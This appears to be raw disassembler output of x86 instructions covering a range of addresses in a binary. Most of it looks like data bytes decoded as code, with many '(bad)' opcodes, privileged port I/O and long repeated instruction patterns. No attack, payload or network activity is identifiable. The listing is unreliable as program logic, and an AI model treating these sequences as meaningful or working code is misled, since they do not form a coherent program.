  421242:	mov    ah,0x67
  421244:	retf   
  421245:	iret   
  421246:	in     al,0x62
  421248:	int3   
  421249:	shr    ecx,cl
  42124b:	jno    0x421227
  42124d:	icebp  
  42124e:	mov    esp,0xef7fa653
  421253:	arpl   WORD PTR [eax],ax
	...
  42127d:	add    BYTE PTR [ebx-0x53991c7c],bl
  421283:	into   
  421284:	add    BYTE PTR [esi],bh
  421286:	jp     0x42123a
  421288:	add    dh,dl
  42128a:	xchg   BYTE PTR [edx],dh
  42128c:	add    al,0x92
  42128e:	test   BYTE PTR [edx],dh
  421290:	add    al,0x8c
  421292:	js     0x4212c6
  421294:	add    al,0x4
  421296:	ins    BYTE PTR es:[edi],dx
  421297:	xor    al,BYTE PTR [esi+ebp*1]
  42129a:	xchg   edx,eax
  42129b:	xor    al,BYTE PTR [esp+ecx*1]
  42129e:	xchg   edi,eax
  42129f:	xor    al,BYTE PTR [edi+edi*8]
  4212a2:	xchg   DWORD PTR [edx],esi
  4212a4:	add    al,0x9
  4212a6:	test   DWORD PTR [edx],esi
  4212a8:	add    al,0x8a
  4212aa:	jp     0x421307
  4212ac:	daa    
  4212ad:	add    al,0x7d
  4212af:	sahf   
  4212b0:	daa    
  4212b1:	add    al,0xba
  4212b3:	lahf   
  4212b4:	daa    
  4212b5:	add    al,0x35
  4212b7:	jge    0x4212e0
  4212b9:	add    al,0xdb
  4212bb:	jbe    0x4212e4
  4212bd:	add    al,0x8
  4212bf:	js     0x4212e8
  4212c1:	add    al,0x89
  4212c3:	ja     0x4212ec
  4212c5:	add    al,0x42
  4212c7:	jae    0x4212f0
  4212c9:	add    al,0xb0
  4212cb:	jb     0x421274
  4212cd:	add    esi,DWORD PTR [edx+esi*2]
  4212d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212d1:	add    esp,DWORD PTR ds:0xf003a774
  4212d7:	jae    0x421280
  4212d9:	add    edi,DWORD PTR [esi+0x70]
  4212dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212dd:	add    edx,esi
  4212df:	mov    DWORD PTR [edi+0x3],esp
	...
  421309:	add    BYTE PTR [eax],al
  42130b:	add    BYTE PTR [edi-0x75],bh
  42130e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42130f:	add    esp,DWORD PTR [ebx-0x37fc587a]
  421315:	test   DWORD PTR [edi-0x58773afd],esp
  42131b:	add    edx,DWORD PTR [ecx-0x1bfc587e]
  421321:	jle    0x4212ca
  421323:	add    ebx,edi
  421325:	jg     0x4212ce
  421327:	add    eax,DWORD PTR [edi-0x80]
  42132a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42132b:	add    ecx,DWORD PTR [eax-0x24fc5882]
  421331:	jle    0x4212da
  421333:	add    edx,DWORD PTR [ebp-0x46fbd92f]
  421339:	shl    BYTE PTR [esi],1
  42133b:	add    al,0x71
  42133d:	int    0x26
  42133f:	add    al,0x80
  421341:	loop   0x421369
  421343:	add    al,0x3d
  421345:	fbld   TBYTE PTR [esi]
  421347:	add    al,0xb7
  421349:	fbld   TBYTE PTR [esi]
  42134b:	add    al,0x7c
  42134d:	loopne 0x42134e
  42134f:	sub    BYTE PTR [edx],bh
  421351:	push   ss
  421352:	fwait
  421353:	sub    DWORD PTR [edx-0x55],eax
  421356:	sahf   
  421357:	sub    DWORD PTR [edx],edi
  421359:	pop    ds
  42135a:	sahf   
  42135b:	sub    DWORD PTR [edx+0x7d],eax
  42135e:	popf   
  42135f:	sub    DWORD PTR [edx],edi
  421361:	call   FWORD PTR [ecx+ebp*1+0x29a0a542]
  421368:	cmp    cl,dh
  42136a:	lahf   
  42136b:	sub    DWORD PTR [edx+0x2c],eax
  42136e:	test   al,0x29
	...
  421398:	add    BYTE PTR [eax],al
  42139a:	cmp    al,BYTE PTR [edx-0x52]
  42139d:	sub    DWORD PTR [edx+0x6d],eax
  4213a0:	scas   al,BYTE PTR es:[edi]
  4213a1:	test   eax,0xa9bd063d
  4213a6:	cmp    eax,0x3da9c031
  4213ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213ac:	shr    BYTE PTR [ecx-0x56400ac3],0x3d
  4213b3:	push   0x933da9bf
  4213b8:	mov    edi,0xbf863da9
  4213bd:	test   eax,0xa9bf213d
  4213c2:	cmp    eax,0x3da9c1c8
  4213c7:	shr    DWORD PTR ds:[ecx-0x563c9bc3],0x3d
  4213cf:	out    0xc2,eax
  4213d1:	test   eax,0xa9c3253d
  4213d6:	cmp    eax,0x3da9c68d
  4213db:	retf   0xa9c4
  4213de:	cmp    eax,0x3a29c86c
  4213e3:	xlat   BYTE PTR ds:[ebx]
  4213e4:	(bad)  
  4213e5:	sub    DWORD PTR [edx-0x20],eax
  4213e8:	(bad)  
  4213e9:	sub    DWORD PTR [edx],edi
  4213eb:	retfw  0x4229
  4213ef:	adc    eax,0x572700cb
  4213f4:	pop    ss
  4213f5:	into   
  4213f6:	pop    ss
  4213f7:	push   edi
  4213f8:	adc    ecx,0xd1e55717
	...
  421426:	add    BYTE PTR [eax],al
  421428:	daa    
  421429:	push   edi
  42142a:	mov    ebp,0xcc5727d5
  42142f:	xlat   BYTE PTR ds:[ebx]
  421430:	pop    ss
  421431:	push   edi
  421432:	add    eax,0x525717da
  421437:	fisub  DWORD PTR [edi+0x57]
  42143a:	(bad)  
  42143b:	fsub   QWORD PTR [edi+0x57]
  42143e:	or     ebx,ebp
  421440:	push   edi
  421441:	push   edi
  421442:	mov    ebp,ebx
  421444:	push   edi
  421445:	push   edi
  421446:	cld    
  421447:	frstor [edi+0x57]
  42144a:	jp     0x42142a
  42144c:	out    0x59,eax
  42144e:	clc    
  42144f:	(bad)  
  421451:	pop    ecx
  421452:	je     0x421436
  421454:	xlat   BYTE PTR ds:[ebx]
  421455:	pop    ecx
  421456:	loop   0x42143a
  421458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421459:	pop    ecx
  42145a:	pavgw  mm4,QWORD PTR [edi-0x681c0aa7]
  421461:	pop    ecx
  421462:	sub    ah,ah
  421464:	xchg   edi,eax
  421465:	pop    ecx
  421466:	(bad)  
  421467:	out    0xa7,al
  421469:	pop    ecx
  42146a:	cld    
  42146b:	out    0xa7,al
  42146d:	pop    ecx
  42146e:	xor    ah,bh
  421470:	xchg   edi,eax
  421471:	pop    ecx
  421472:	outs   dx,BYTE PTR ds:[esi]
  421473:	jmp    0xed176e0f
  421478:	out    0x58,eax
  42147a:	mov    esi,0x6758e7ee
  42147f:	cmc    
  421480:	xlat   BYTE PTR ds:[ebx]
  421481:	pop    eax
  421482:	dec    edx
  421483:	not    bh
  421485:	pop    eax
  421486:	add    BYTE PTR [eax],al
  421488:	daa    
  421489:	pop    ecx
	...
  4214b6:	daa    
  4214b7:	pop    ecx
  4214b8:	add    BYTE PTR [eax],al
  4214ba:	pop    ss
  4214bb:	pop    ecx
  4214bc:	add    BYTE PTR [eax],al
  4214be:	repnz add BYTE PTR ds:[eax],al
  4214c2:	repnz add BYTE PTR ds:[ecx+0x62],al
  4214c7:	stos   DWORD PTR es:[edi],eax
  4214c8:	in     eax,0x6d
  4214ca:	jb     0x42151e
  4214cc:	int3   
  4214cd:	pop    esi
  4214ce:	ins    DWORD PTR es:[edi],dx
  4214cf:	call   0x52b8:0x33725104
  4214d6:	ins    DWORD PTR es:[edi],dx
  4214d7:	daa    
  4214d8:	retf   0x6e4a
  4214db:	sub    eax,0x351353b2
  4214e0:	(bad)  
  4214e1:	jmp    DWORD PTR [edx+0x56]
  4214e4:	arpl   WORD PTR cs:[esi],si
  4214e7:	dec    edi
  4214e8:	add    al,0x23
  4214ea:	outs   dx,BYTE PTR ds:[esi]
  4214eb:	sar    BYTE PTR [eax-0x29ffd201],0x62
  4214f2:	ds popa 
  4214f4:	in     al,dx
  4214f5:	bound  esp,QWORD PTR [edx]
  4214f7:	es (bad) 
  4214f9:	ja     0x42151e
  4214fb:	adc    esi,edx
  4214fd:	jae    0x42151a
  4214ff:	mov    bl,0x0
  421501:	pop    edi
  421502:	fcom   QWORD PTR [eax]
  421504:	in     eax,0x2d
  421506:	fcom   QWORD PTR [edx]
  421508:	aad    0xff
  42150a:	or     ecx,DWORD PTR ss:[esi]
  42150d:	or     dh,BYTE PTR [ebx]
  42150f:	clc    
  421510:	or     DWORD PTR [eax],esp
  421512:	adc    al,0x1b
  421514:	out    0x68,eax
  421516:	push   ds
  421517:	pop    es
  421518:	pop    es
  421519:	and    BYTE PTR [eax],al
	...
  421543:	add    dl,ah
  421545:	(bad)  
  421546:	in     al,dx
  421547:	pop    ds
  421548:	aaa    
  421549:	movlps xmm4,QWORD PTR [eax]
  42154c:	pop    esi
  42154d:	pop    ds
  42154e:	pop    es
  42154f:	pop    es
  421550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421551:	int3   
  421552:	and    BYTE PTR [edi],al
  421554:	aaa    
  421555:	adc    ah,dh
  421557:	ja     0x4214f0
  421559:	adc    ebp,0x2112471f
  42155f:	and    BYTE PTR [ebx+0x5b],bl
  421562:	sbb    BYTE PTR [esi+ebx*2],ah
  421565:	push   edx
  421566:	pop    es
  421567:	and    al,0x9b
  421569:	ins    BYTE PTR es:[edi],dx
  42156a:	pop    ebx
  42156b:	jmp    0x4215c6
  42156d:	push   edx
  42156e:	fsub   QWORD PTR [ebx]
  421570:	pop    ecx
  421571:	jno    0x4215c5
  421573:	or     DWORD PTR [ebx+edi*1],esi
  421576:	inc    ebx
  421577:	loope  0x4215ce
  421579:	cmp    esp,eax
  42157b:	and    ebx,DWORD PTR [esi]
  42157d:	mul    DWORD PTR ss:[ebx]
  421580:	ds cmp eax,edi
  421583:	and    ebx,DWORD PTR [esi]
  421585:	cmp    esp,eax
  421587:	(bad)  
  421588:	pop    ds
  421589:	cmp    eax,edi
  42158b:	and    edi,DWORD PTR [esi]
  42158d:	mov    bh,bh
  42158f:	loopne 0x4215b6
  421591:	outs   dx,DWORD PTR ds:[esi]
  421592:	mov    edx,0xb775815
  421597:	call   0x429113d
  42159c:	ds pop ebx
  42159e:	out    0x3,eax
  4215a0:	ds pop ebx
  4215a2:	out    0x3,eax
  4215a4:	ds pop ebx
  4215a6:	out    0x3,eax
	...
  4215d0:	add    BYTE PTR [eax],al
  4215d2:	ds pop ebx
  4215d4:	out    0x3,eax
  4215d6:	ds pop ebx
  4215d8:	out    0x3,eax
  4215da:	ds pop ebx
  4215dc:	out    0x3,eax
  4215de:	ds pop ebx
  4215e0:	out    0x3,eax
  4215e2:	ds pop ebx
  4215e4:	out    0x3,eax
  4215e6:	ds pop ebx
  4215e8:	out    0x3,eax
  4215ea:	ds pop ebx
  4215ec:	out    0x3,eax
  4215ee:	ds pop ebx
  4215f0:	out    0x3,eax
  4215f2:	ds pop ebx
  4215f4:	out    0x3,eax
  4215f6:	ds pop ebx
  4215f8:	out    0x3,eax
  4215fa:	ds pop ebx
  4215fc:	out    0x3,eax
  4215fe:	ds pop ebx
  421600:	out    0x3,eax
  421602:	ds pop ebx
  421604:	add    cl,ch
  421606:	cmp    eax,0x3de9005b
  42160b:	pop    ebx
  42160c:	add    cl,ch
  42160e:	cmp    eax,0x3de9005b
  421613:	pop    ebx
  421614:	add    cl,ch
  421616:	cmp    eax,0x3de9005b
  42161b:	pop    ebx
  42161c:	add    cl,ch
  42161e:	cmp    eax,0x3de9005b
  421623:	pop    ebx
  421624:	add    cl,ch
  421626:	cmp    eax,0x3de9005b
  42162b:	pop    ebx
  42162c:	add    cl,ch
  42162e:	cmp    eax,0x3de9005b
  421633:	pop    ebx
  421634:	add    cl,ch
	...
  42165e:	add    BYTE PTR [eax],al
  421660:	cmp    eax,0x3de9005b
  421665:	pop    ebx
  421666:	add    cl,ch
  421668:	cmp    eax,0x3de9005b
  42166d:	pop    ebx
  42166e:	add    cl,ch
  421670:	cmp    eax,0x3de9005b
  421675:	pop    ebx
  421676:	add    cl,ch
  421678:	cmp    eax,0x3de9005b
  42167d:	pop    ebx
  42167e:	add    cl,ch
  421680:	cmp    eax,0x3de9005b
  421685:	pop    ebx
  421686:	add    cl,ch
  421688:	cmp    eax,0x3de9005b
  42168d:	pop    ebx
  42168e:	add    cl,ch
  421690:	cmp    eax,0x3de9005b
  421695:	pop    ebx
  421696:	add    cl,ch
  421698:	cmp    eax,0x3de9005b
  42169d:	pop    ebx
  42169e:	add    cl,ch
  4216a0:	cmp    eax,0x3de9005b
  4216a5:	pop    ebx
  4216a6:	add    BYTE PTR [eax],al
  4216a8:	pop    ss
  4216a9:	pop    esi
  4216aa:	add    BYTE PTR [eax],al
  4216ac:	pop    ss
  4216ad:	pop    esi
  4216ae:	add    BYTE PTR [eax],al
  4216b0:	daa    
  4216b1:	pop    esi
  4216b2:	add    BYTE PTR [eax],al
  4216b4:	daa    
  4216b5:	pop    esi
  4216b6:	add    BYTE PTR [eax],al
  4216b8:	pop    ss
  4216b9:	pop    esi
  4216ba:	add    BYTE PTR [eax],al
  4216bc:	pop    ss
  4216bd:	pop    esi
  4216be:	add    BYTE PTR [eax],al
  4216c0:	out    0x5d,eax
	...
  4216ee:	out    0x5d,eax
  4216f0:	add    BYTE PTR [eax],al
  4216f2:	xlat   BYTE PTR ds:[ebx]
  4216f3:	pop    ebp
  4216f4:	add    BYTE PTR [eax],al
  4216f6:	xlat   BYTE PTR ds:[ebx]
  4216f7:	pop    ebp
  4216f8:	add    BYTE PTR [eax],al
  4216fa:	out    0x5d,eax
  4216fc:	add    BYTE PTR [eax],al
  4216fe:	out    0x5d,eax
  421700:	add    BYTE PTR [eax],al
  421702:	xlat   BYTE PTR ds:[ebx]
  421703:	pop    ebp
  421704:	add    BYTE PTR [eax],al
  421706:	xlat   BYTE PTR ds:[ebx]
  421707:	pop    ebp
  421708:	add    BYTE PTR [eax],al
  42170a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42170b:	pop    ebp
  42170c:	add    BYTE PTR [eax],al
  42170e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42170f:	pop    ebp
  421710:	add    BYTE PTR [eax],al
  421712:	xchg   edi,eax
  421713:	pop    ebp
  421714:	add    BYTE PTR [eax],al
  421716:	xchg   edi,eax
  421717:	pop    ebp
  421718:	add    BYTE PTR [eax],al
  42171a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42171b:	pop    ebp
  42171c:	add    BYTE PTR [eax],al
  42171e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42171f:	pop    ebp
  421720:	add    BYTE PTR [eax],al
  421722:	xchg   edi,eax
  421723:	pop    ebp
  421724:	add    BYTE PTR [eax],al
  421726:	xchg   edi,eax
  421727:	pop    ebp
  421728:	add    BYTE PTR [eax],al
  42172a:	addr16 pop ebp
  42172c:	add    BYTE PTR [eax],al
  42172e:	addr16 pop ebp
  421730:	add    BYTE PTR [eax],al
  421732:	push   edi
  421733:	pop    ebp
  421734:	add    BYTE PTR [eax],al
  421736:	push   edi
  421737:	pop    ebp
  421738:	add    BYTE PTR [eax],al
  42173a:	addr16 pop ebp
  42173c:	add    BYTE PTR [eax],al
  42173e:	addr16 pop ebp
  421740:	add    BYTE PTR [eax],al
  421742:	push   edi
  421743:	pop    ebp
  421744:	add    BYTE PTR [eax],al
  421746:	push   edi
  421747:	pop    ebp
  421748:	add    BYTE PTR [eax],al
  42174a:	add    al,BYTE PTR ds:[ecx]
  42174d:	add    BYTE PTR [esi],bh
  42174f:	add    al,BYTE PTR [ecx]
	...
  421779:	add    BYTE PTR [eax],al
  42177b:	add    BYTE PTR [esi],bh
  42177d:	add    al,BYTE PTR [ecx]
  42177f:	add    BYTE PTR [esi],bh
  421781:	add    al,BYTE PTR [ecx]
  421783:	add    BYTE PTR [esi],bh
  421785:	add    al,BYTE PTR [ecx]
  421787:	add    BYTE PTR [esi],bh
  421789:	add    al,BYTE PTR [ecx]
  42178b:	add    BYTE PTR [esi],bh
  42178d:	add    al,BYTE PTR [ecx]
  42178f:	add    BYTE PTR [esi],bh
  421791:	add    al,BYTE PTR [ecx]
  421793:	add    BYTE PTR [esi],bh
  421795:	add    al,BYTE PTR [ecx]
  421797:	add    BYTE PTR [esi],bh
  421799:	add    al,BYTE PTR [ecx]
  42179b:	add    BYTE PTR [esi],bh
  42179d:	add    al,BYTE PTR [ecx]
  42179f:	add    BYTE PTR [esi],bh
  4217a1:	add    al,BYTE PTR [ecx]
  4217a3:	add    BYTE PTR [esi],bh
  4217a5:	add    al,BYTE PTR [ecx]
  4217a7:	add    BYTE PTR [esi],bh
  4217a9:	add    al,BYTE PTR [ecx]
  4217ab:	add    BYTE PTR [esi],bh
  4217ad:	add    al,BYTE PTR [ecx]
  4217af:	add    BYTE PTR [esi],bh
  4217b1:	add    al,BYTE PTR [ecx]
  4217b3:	add    BYTE PTR [esi],bh
  4217b5:	add    al,BYTE PTR [ecx]
  4217b7:	add    BYTE PTR [esi],bh
  4217b9:	add    al,BYTE PTR [ecx]
  4217bb:	add    BYTE PTR [esi],bh
  4217bd:	add    al,BYTE PTR [ecx]
  4217bf:	add    BYTE PTR [esi],bh
  4217c1:	add    al,BYTE PTR [ecx]
  4217c3:	add    BYTE PTR [esi],bh
  4217c5:	add    esp,DWORD PTR [ebx+eax*2]
  4217c8:	sbb    DWORD PTR [ebx-0x54],edi
  4217cb:	retf   
  4217cc:	cdq    
  4217cd:	xor    BYTE PTR ds:0xad10a6ba,0x31
  4217d4:	dec    esi
  4217d5:	jnp    0x421783
  4217d7:	retf   
  4217d8:	popa   
  4217d9:	add    esp,DWORD PTR [ebx+eax*2]
  4217dc:	loope  0x42175f
  4217de:	add    DWORD PTR [eax+0x0],eax
	...
  421809:	add    BYTE PTR [esi],bh
  42180b:	bound  eax,QWORD PTR [eax+edx*1]
  42180e:	ds cli 
  421810:	add    BYTE PTR [esi+edi*1],al
  421813:	add    al,0x1
  421815:	dec    DWORD PTR [ecx+0x5b]
  421818:	out    0x3,eax
  42181a:	mov    esi,0x7e03e75b
  42181f:	pop    ebx
  421820:	out    0x3,eax
  421822:	pop    esi
  421823:	pop    ebx
  421824:	out    0x3,eax
  421826:	dec    esi
  421827:	pop    ebx
  421828:	out    0x3,eax
  42182a:	ss pop ebx
  42182c:	out    0x3,eax
  42182e:	inc    edx
  42182f:	pop    ebx
  421830:	out    0x3,eax
  421832:	cmp    al,0x5b
  421834:	out    0x3,eax
  421836:	or     eax,edi
  421838:	out    0x83,al
  42183a:	ds pop ebx
  42183c:	out    0xc3,eax
  42183e:	stc    
  42183f:	mul    esi
  421841:	and    edi,DWORD PTR [esi]
  421843:	pop    ebx
  421844:	out    0xf3,eax
  421846:	jmp    0x3e4dff42
  42184b:	pop    ebx
  42184c:	out    0xff,eax
  42184e:	fincstp 
  421850:	out    0x1,al
  421852:	ds pop ebx
  421854:	out    0x4,eax
  421856:	ds pop ebx
  421858:	addr16 add al,0x3e
  42185b:	pop    ebx
  42185c:	daa    
  42185d:	add    al,0x3e
  42185f:	pop    ebx
  421860:	mov    DWORD PTR [ebx],0x3f75b3e
  421866:	ds pop ebx
  421868:	out    dx,eax
  421869:	add    edi,DWORD PTR [esi]
  42186b:	pop    ebx
  42186c:	jecxz  0x421871
	...
  421896:	add    BYTE PTR [eax],al
  421898:	ds pop ebx
  42189a:	jmp    0xe89d56a2
  42189f:	add    edi,DWORD PTR [esi]
  4218a1:	pop    ebx
  4218a2:	pop    ds
  4218a3:	adc    al,0x56
  4218a5:	cmp    edi,edi
  4218a7:	repz inc ecx
  4218a9:	pop    ebx
  4218aa:	adc    BYTE PTR ds:0xf4f03a19,dl
  4218b0:	inc    eax
  4218b1:	pop    edx
  4218b2:	add    DWORD PTR [edx],edx
  4218b4:	adc    al,0x3d
  4218b6:	loope  0x4218a9
  4218b8:	inc    edi
  4218b9:	pop    ebp
  4218ba:	add    dl,dh
  4218bc:	sub    al,0x42
  4218be:	and    edi,ebp
  4218c0:	cmp    ecx,DWORD PTR [ecx+0x26]
  4218c3:	pop    es
  4218c4:	push   eax
  4218c5:	gs push es
  4218c7:	fmul   QWORD PTR [esi+0x42]
  4218ca:	and    esi,esp
  4218cc:	bound  eax,QWORD PTR cs:[ebx]
  4218cf:	int    0x39
  4218d1:	inc    edi
  4218d2:	and    al,0xe5
  4218d4:	adc    DWORD PTR [ebx+0x4],esp
  4218d7:	loop   0x4218e5
  4218d9:	fs add eax,ebp
  4218dc:	aas    
  4218dd:	pop    edi
  4218de:	push   es
  4218df:	loope  0x421918
  4218e1:	addr16 push cs
  4218e3:	test   BYTE PTR [edx],0x4c
  4218e6:	adc    esi,esi
  4218e8:	cli    
  4218e9:	push   ebx
  4218ea:	sbb    al,0xe4
  4218ec:	in     eax,dx
  4218ed:	fs adc eax,0x195ce9e9
  4218f3:	idiv   DWORD PTR [esi]
  4218f5:	dec    edi
  4218f6:	pop    es
  4218f7:	xlat   BYTE PTR ds:[ebx]
  4218f8:	iret   
  4218f9:	arpl   WORD PTR [ecx],ax
  4218fb:	rol    BYTE PTR [eax],1
	...
  421925:	add    al,dl
  421927:	addr16 push es
  421929:	ror    esp,cl
  42192b:	(bad)  
  42192c:	call   eax
  42192e:	sub    al,0x55
  421930:	and    al,0xcf
  421932:	dec    ebx
  421933:	push   edx
  421934:	and    eax,0x2d3b59db
  421939:	ret    0x3d4d
  42193c:	xor    eax,0x274231c8
  421941:	mov    eax,0xe91d575c
  421946:	xchg   ecx,eax
  421947:	cmc    
  421948:	(bad)  
  421949:	call   0xe942748b
  42194e:	cmp    eax,0x79e5fcf6
  421953:	cmc    
  421954:	(bad)  
  421955:	in     al,dx
  421956:	cmp    eax,0x69e4fff6
  42195b:	cmc    
  42195c:	cld    
  42195d:	add    BYTE PTR [ebx+0x5a],dl
  421960:	add    BYTE PTR [eax],al
  421962:	addr16 pop edx
  421964:	std    
  421965:	jmp    DWORD PTR [edi-0xa]
  421968:	cld    
  421969:	call   DWORD PTR [edi-0xa]
  42196c:	std    
  42196d:	add    BYTE PTR [ebx-0xa],dl
  421970:	std    
  421971:	add    BYTE PTR [edi],ah
  421973:	idiv   ah
  421975:	jmp    DWORD PTR [ebx]
  421977:	idiv   ah
  421979:	add    BYTE PTR [ebx],ah
  42197b:	pop    edx
  42197c:	std    
  42197d:	add    BYTE PTR [edi],dl
  42197f:	pop    edx
  421980:	add    BYTE PTR [ecx],al
  421982:	and    ebx,DWORD PTR [edx+0x0]
  421985:	add    BYTE PTR [ebx],ah
  421987:	idiv   ah
  421989:	inc    DWORD PTR [eax]
	...
  4219b3:	add    BYTE PTR [edi],dl
  4219b5:	idiv   ah
  4219b7:	add    BYTE PTR [edi],dl
  4219b9:	idiv   ah
  4219bb:	add    bh,ah
  4219bd:	cmc    
  4219be:	std    
  4219bf:	jmp    edi
  4219c1:	cmc    
  4219c2:	std    
  4219c3:	call   edi
  4219c5:	pop    ecx
  4219c6:	std    
  4219c7:	add    bh,dl
  4219c9:	pop    ecx
  4219ca:	std    
  4219cb:	add    bl,ah
  4219cd:	cmc    
  4219ce:	cld    
  4219cf:	add    bl,ah
  4219d1:	pop    ecx
  4219d2:	std    
  4219d3:	jmp    ebx
  4219d5:	pop    ecx
  4219d6:	add    BYTE PTR [ecx],al
  4219d8:	rcr    DWORD PTR [ecx+0x0],cl
  4219db:	add    DWORD PTR [ebx-0x580002a7],esp
  4219e1:	pop    ecx
  4219e2:	add    BYTE PTR [eax],al
  4219e4:	mov    ds:0x93fffcf5,eax
  4219e9:	cmc    
  4219ea:	std    
  4219eb:	jmp    DWORD PTR [edi-0x58feffa7]
  4219f1:	pop    ecx
  4219f2:	std    
  4219f3:	jmp    DWORD PTR [ebx-0x6cff020b]
  4219f9:	pop    ecx
  4219fa:	add    BYTE PTR [eax],al
  4219fc:	addr16 pop ecx
  4219fe:	std    
  4219ff:	add    BYTE PTR [esi],bh
  421a01:	add    al,0xfd
  421a03:	(bad)  
  421a04:	ds add al,0x1
  421a07:	add    BYTE PTR [edi],bh
  421a09:	add    al,0x1
  421a0b:	add    BYTE PTR [edi],bh
  421a0d:	add    al,0xfd
  421a0f:	call   DWORD PTR [ecx+0x7]
  421a12:	add    edi,edi
  421a14:	ds add al,0x1
  421a17:	inc    DWORD PTR [eax]
	...
  421a41:	add    BYTE PTR [ecx+0x3],al
  421a44:	std    
  421a45:	(bad)  
  421a46:	cmp    edi,edi
  421a48:	add    BYTE PTR [eax],al
  421a4a:	aas    
  421a4b:	add    bh,ch
  421a4d:	jmp    FWORD PTR [ecx]
  421a4f:	inc    DWORD PTR [eax]
  421a51:	add    BYTE PTR [esi],bh
  421a53:	push   es
  421a54:	std    
  421a55:	(bad)  
  421a56:	ds (bad) 
  421a58:	cld    
  421a59:	(bad)  
  421a5a:	adc    DWORD PTR [edi],eax
  421a5c:	std    
  421a5d:	(bad)  
  421a5e:	inc    BYTE PTR ds:[eax]
  421a61:	inc    DWORD PTR [ecx]
  421a63:	add    eax,DWORD PTR [ecx]
  421a65:	(bad)  
  421a66:	ds (bad) 
  421a68:	cld    
  421a69:	(bad)  
  421a6a:	ds push es
  421a6c:	add    DWORD PTR [eax],eax
  421a6e:	aas    
  421a6f:	(bad)  
  421a70:	cld    
  421a71:	jmp    ecx
  421a73:	push   es
  421a74:	std    
  421a75:	(bad)  
  421a76:	fld    DWORD PTR [edx]
  421a78:	std    
  421a79:	(bad)  
  421a7a:	ds push es
  421a7c:	std    
  421a7d:	dec    ecx
  421a7f:	add    bh,ch
  421a81:	(bad)  
  421a82:	ds add bh,ch
  421a85:	(bad)  
  421a86:	add    al,BYTE PTR ds:[ecx]
  421a89:	add    BYTE PTR [esi],bh
  421a8b:	push   es
  421a8c:	add    edi,edi
  421a8e:	test   eax,0xa1fefd02
  421a93:	add    al,BYTE PTR [ecx]
  421a95:	add    BYTE PTR [esi],bh
  421a97:	inc    BYTE PTR [eax]
  421a99:	(bad)  
  421a9a:	and    al,BYTE PTR ds:[ecx-0x7efd41f0]
  421aa1:	add    BYTE PTR [esi+0x83e75b],bh
	...
  421acf:	add    BYTE PTR [esi],bh
  421ad1:	pop    ebx
  421ad2:	pop    es
  421ad3:	test   BYTE PTR [esi+0x5b],cl
  421ad6:	out    0x3,eax
  421ad8:	dec    esi
  421ad9:	pop    ebx
  421ada:	pop    es
  421adb:	add    al,0x3e
  421add:	pop    ebx
  421ade:	pop    es
  421adf:	add    al,0x2e
  421ae1:	fild   DWORD PTR [esi]
  421ae3:	test   BYTE PTR [esi],bh
  421ae5:	fild   DWORD PTR [esi]
  421ae7:	add    al,0x3e
  421ae9:	fild   DWORD PTR [esi]
  421aeb:	test   BYTE PTR [esi],ch
  421aed:	(bad)  
  421aef:	or     DWORD PTR [esi-0x25],0xffffffe6
  421af3:	add    edi,DWORD PTR [esi]
  421af5:	(bad)  
  421af7:	cmp    DWORD PTR [esi],0xffffffdb
  421afa:	out    0x3,al
  421afc:	dec    esi
  421afd:	pop    ebx
  421afe:	mov    DWORD PTR [ebx],0x3c75b3e
  421b04:	cs (bad) 
  421b07:	sub    DWORD PTR [esi],0x5b
  421b0a:	mov    DWORD PTR [ebx],0x84075b2e
  421b10:	ds (bad) 
  421b13:	add    edi,DWORD PTR [esi]
  421b15:	pop    ebx
  421b16:	out    0x3,eax
  421b18:	ds (bad) 
  421b1b:	cmp    DWORD PTR [esi],0x5b
  421b1e:	pop    es
  421b1f:	test   BYTE PTR [esi],ch
  421b21:	pop    ebx
  421b22:	out    0x3,eax
  421b24:	fild   DWORD PTR cs:[esi]
  421b27:	add    al,0x2e
  421b29:	pop    ebx
  421b2a:	pop    es
  421b2b:	add    al,0x3e
  421b2d:	(bad)  
  421b2f:	add    edi,DWORD PTR [esi]
  421b31:	pop    ebx
  421b32:	out    0x83,eax
	...
  421b5c:	add    BYTE PTR [eax],al
  421b5e:	dec    esi
  421b5f:	pop    ebx
  421b60:	mov    DWORD PTR [ebx-0x7c18a4c2],0x3e6db4e
  421b6a:	cs fcmovnb st,st(6)
  421b6d:	cmp    DWORD PTR [esi],0x5b
  421b70:	add    cl,ch
  421b72:	cmp    eax,0xbdc9005b
  421b77:	dec    edx
  421b78:	add    BYTE PTR [ecx],cl
  421b7a:	inc    edx
  421b7b:	dec    ebx
  421b7c:	sub    cl,0x3d
  421b7f:	dec    ebx
  421b80:	add    BYTE PTR [ecx],cl
  421b82:	ret    0x805a
  421b85:	jmp    0xe9c266c7
  421b8a:	mov    ebp,0xbde9804a
  421b8f:	pop    edx
  421b90:	add    cl,ch
  421b92:	cmp    eax,0xbde9804b
  421b97:	pop    edx
  421b98:	or     cl,0x3d
  421b9b:	pop    ebx
  421b9c:	add    cl,cl
  421b9e:	mov    ebp,0xbdc9804b
  421ba3:	dec    ebx
  421ba4:	add    cl,cl
  421ba6:	cmp    eax,0xbde9005b
  421bab:	pop    ebx
  421bac:	add    cl,ch
  421bae:	cmp    eax,0xbdc9805b
  421bb3:	pop    ebx
  421bb4:	add    cl,ch
  421bb6:	mov    ebp,0x3de9804b
  421bbb:	dec    ebx
  421bbc:	add    BYTE PTR [ecx],cl
  421bbe:	cmp    bl,BYTE PTR [ebx-0x80]
  421bc1:	or     DWORD PTR [eax],eax
	...
  421beb:	add    BYTE PTR [edx+0x4b],al
  421bee:	add    BYTE PTR [ecx],cl
  421bf0:	mov    edx,0x4209805b
  421bf5:	pop    ebx
  421bf6:	or     BYTE PTR [ecx],0x3a
  421bf9:	dec    ebx
  421bfa:	add    cl,ch
  421bfc:	mov    ebp,0x3de9004b
  421c01:	pop    ebx
  421c02:	add    cl,ch
  421c04:	mov    ebp,0xbdc9805b
  421c09:	pop    ebx
  421c0a:	add    cl,ch
  421c0c:	cmp    eax,0x3dc9805b
